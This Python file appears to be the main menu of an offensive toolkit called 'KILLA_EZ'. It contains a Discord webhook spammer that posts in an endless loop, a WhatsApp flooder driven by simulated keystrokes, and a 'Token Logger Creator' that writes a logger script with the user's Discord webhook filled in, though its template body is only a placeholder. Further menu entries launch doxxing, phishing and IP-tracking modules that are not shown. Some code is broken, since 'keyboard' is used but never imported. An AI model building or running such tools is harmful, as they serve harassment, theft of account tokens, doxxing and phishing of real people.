from colorama import Fore
import os
import shutil
import time
import requests
import random
import platform
import webbrowser
from tools import doxxing, goldenphish, ser, scanner

local_version = "1.0.1"

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def spam():
    clear()
    print(f"""{Fore.GREEN}
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ███████╗██████╔╝███████║██╔████╔██║
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
  """)
    try:
        webhook = input('\n[+] Enter the webhook URL: ')
        message = input('[+] Enter the message you want to send via the webhook: ')
        while True:
            requests.post(webhook, json={'username': 'Spammer', 'content': message})
            print('\n[~] Sending message...')
    except KeyboardInterrupt:
        print('\n[~] Stopping spam...')
        time.sleep(1)
        menu()

def tools():
    clear()
    print(f"""{Fore.BLUE}
██████████████████████████████████████████████████████████████████████████████████
                            TOOLS MENU                                
  [1] Doxxing Tools                                                    
  [2] Phishing Tools                                                   
  [00] Return to the main menu                                         
  [99] Exit                                                            
██████████████████████████████████████████████████████████████████████████████████
    """)
    a = input('\nroot@KILLA_EZ:~# ')
    if a == "1":
        doxxing.doxxer()
    elif a == "2":
        goldenphish.phish()
    elif a == "00":
        menu()
    elif a == "99":
        exit()
    else:
        print(f'\n{Fore.RED}[!] Invalid option.')
        time.sleep(2)
        tools()

def creds():
    clear()
    print(f'''{Fore.MAGENTA}
CREDITS:
- Developed by:
  [Spyk3r]
    Discord: ! Spyk3r#0614
    Twitter: https://twitter.com/_Spyk33r_
    GitHub: https://github.com/Spyk3r
  [Euronymou5]
    Discord: Euronymou5#3155
    Twitter: https://twitter.com/Euronymou51
    GitHub: https://github.com/Euronymou5
  ''')
    input('\n[~] Press Enter to continue...')
    menu()

def tracker():
    if os.name == "nt":
        os.system("python track/omega.py")
    else:
        os.system("python3 track/omega.py")

def waspam():
    clear()
    print(f"""{Fore.MAGENTA}
Launching WhatsApp Nuker...
    """)
    print('\n[~] Opening WhatsApp Web...')
    webbrowser.open_new_tab('https://web.whatsapp.com/')
    input(f'\n{Fore.YELLOW}[~] Once inside WhatsApp Web, scan the QR code and press Enter...')
    message = input(f'\n{Fore.BLUE}[~] Enter the message you want to send: ')
    if not message.strip():
        print(f'\n{Fore.RED}[!] Error: You must enter a message.')
        time.sleep(3)
        waspam()
    else:
        count = int(input(f'\n{Fore.BLUE}[~] Enter the number of messages to send: '))
        if count <= 0:
            print(f'\n{Fore.RED}[!] Error: Invalid number of messages.')
            time.sleep(3)
            waspam()
        else:
            print('\n[~] The message will be sent in 5 seconds. Make sure you are inside the desired chat...')
            time.sleep(5)
            for _ in range(count):
                print('\n[~] Sending message...')
                keyboard.write(message)
                keyboard.press_and_release('enter')
            menu()

def tokenlogger():
    clear()
    print(f"""{Fore.LIGHTBLUE_EX}
██████████████████████████████████████████████████████████████████████████████████
                   TOKEN LOGGER CREATOR                   
██████████████████████████████████████████████████████████████████████████████████
    """)
    if os.path.isfile('logger.py'):
        os.remove('logger.py')
    variable_hook = input(f'\n{Fore.GREEN}[~] Enter your Discord Webhook URL: ')
    with open('logger.py', 'w') as f:
        f.write('''<YOUR TOKEN LOGGER SCRIPT TEMPLATE HERE>'''.replace("webnook", variable_hook))
    print(f'\n{Fore.YELLOW}[~] Compiling token logger...')
    time.sleep(2)
    menu()

def gen():
    clear()
    print(f"""{Fore.LIGHTCYAN_EX}
PASSWORD GENERATOR
    """)
    length = int(input(f'\n{Fore.YELLOW}[~] Enter the password length (Max 77): '))
    if length > 77:
        print(f'\n{Fore.RED}[!] Error: Password length cannot exceed 77.')
        time.sleep(3)
        gen()
    else:
        chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&*(){}[]/?!@#$abcdefghijklmnopqrstuvwxyz"
        password = "".join(random.sample(chars, length))
        print(f'\n{Fore.GREEN}[~] Generated Password: {password}')
        input(f'\n{Fore.LIGHTCYAN_EX}[~] Press Enter to continue...')
        menu()

def menu():
    clear()
    print(f'''{Fore.LIGHTCYAN_EX}
██████████████████████████████████████████████████████████████████████████████████
MAIN MENU
  [1] Token Logger Creator                                                    
  [2] IP Tracker                                                             
  [3] Discord Webhook Spammer                                                
  [4] Tools Installer                                                        
  [5] User Searcher                                                          
  [6] Scanner                                                                
  [7] Password Generator                                                     
  [8] WhatsApp Nuker                                                         
  [00] Credits                                                               
  [99] Exit                                                                  
██████████████████████████████████████████████████████████████████████████████████
    ''')
    prompt = input(f'\n{Fore.RESET}root@KILLA_EZ:~# ')
    if prompt == "1":
        tokenlogger()
    elif prompt == "2":
        tracker()
    elif prompt == "3":
        spam()
    elif prompt == "4":
        tools()
    elif prompt == "5":
        ser.ser_menu()
    elif prompt == "6":
        scanner.scan()
    elif prompt == "7":
        gen()
    elif prompt == "8":
        waspam()
    elif prompt == "00":
        creds()
    elif prompt == "99":
        exit()
    else:
        print(f'\n{Fore.RED}[!] Invalid option.')
        time.sleep(2)
        menu()

menu()

